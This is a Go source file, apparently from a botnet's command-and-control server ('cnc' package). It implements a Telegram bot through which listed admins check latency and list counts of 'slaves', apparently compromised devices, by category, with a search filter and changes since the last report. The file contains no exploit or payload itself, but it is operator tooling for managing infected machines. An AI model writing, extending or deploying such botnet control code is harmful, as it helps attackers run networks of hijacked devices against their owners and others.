package telegram

import (
	"cnc/core/config"
	"cnc/core/slaves"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

var PreviousDistribution map[string]int

func HandleCommand(bot *tgbotapi.BotAPI) error {
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates, err := bot.GetUpdatesChan(u)
	if err != nil {
		return err
	}

	for update := range updates {
		if update.Message == nil {
			continue
		}

		if update.Message.IsCommand() {
			cmd := update.Message.Command()
			switch cmd {
			case "ping":
				start := time.Now()
				conn, err := net.Dial("tcp", "1.1.1.1:443")
				if err != nil {
					return err
				}
				conn.Close()
				duration := time.Since(start)

				var durationStr string
				if duration.Milliseconds() < 1000 {
					durationStr = fmt.Sprintf("%dms", duration.Milliseconds())
				} else {
					durationStr = fmt.Sprintf("%.2fs", duration.Seconds())
				}

				msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("pong! %s", durationStr))
				_, err = bot.Send(msg)
				if err != nil {
					log.Println(err)
					return err
				}
			case "bots":
				userID := update.Message.From.ID
				if !isAdmin(userID, config.Config.Telegram.Admins) {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Sorry, you are not authorized to use this bot.")
					_, err := bot.Send(msg)
					if err != nil {
						log.Println(err)
					}
					continue
				}

				/* Split the command text into words */
				words := strings.Fields(update.Message.Text)

				/* Check if a search query is provided */
				if len(words) > 1 && words[1] == "-s" {
					if len(words) > 2 {
						/* If a search query is provided, filter the slaves by the query */
						searchQuery := words[2]
						m := filterSlavesByQuery(slaves.CL.Distribution(), searchQuery)
						totalCount := slaves.CL.Count()

						message := formatMessage(m, totalCount)

						msg := tgbotapi.NewMessage(update.Message.Chat.ID, message)
						_, err = bot.Send(msg)
						if err != nil {
							log.Println(err)
							return err
						}
					} else {
						/* If no search query is provided, show an error message */
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Please provide a search query after -s.")
						_, err := bot.Send(msg)
						if err != nil {
							log.Println(err)
						}
					}
				} else {
					/* If no arguments are provided, show all slaves */
					m := slaves.CL.Distribution()
					totalCount := slaves.CL.Count()

					message := formatMessage(m, totalCount)

					msg := tgbotapi.NewMessage(update.Message.Chat.ID, message)
					_, err = bot.Send(msg)
					if err != nil {
						log.Println(err)
						return err
					}
				}
				continue
			}
		}
	}
	return nil
}

func filterSlavesByQuery(m map[string]int, query string) map[string]int {
	filtered := make(map[string]int)
	for k, v := range m {
		if strings.Contains(k, query) {
			filtered[k] = v
		}
	}
	return filtered
}

func formatMessage(m map[string]int, totalCount int) string {
	message := ""
	for k, v := range m {
		change := v - PreviousDistribution[k]
		var msg string
		if change > 0 {
			msg = fmt.Sprintf("%s: %d (+%d)", k, v, change)
		} else if change < 0 {
			msg = fmt.Sprintf("%s: %d (%d)", k, v, change)
		} else {
			msg = fmt.Sprintf("%s: %d", k, v)
		}
		message += msg + "\n"
	}
	totalMsg := fmt.Sprintf("\n - Total: %d", totalCount)
	message += totalMsg
	return message
}
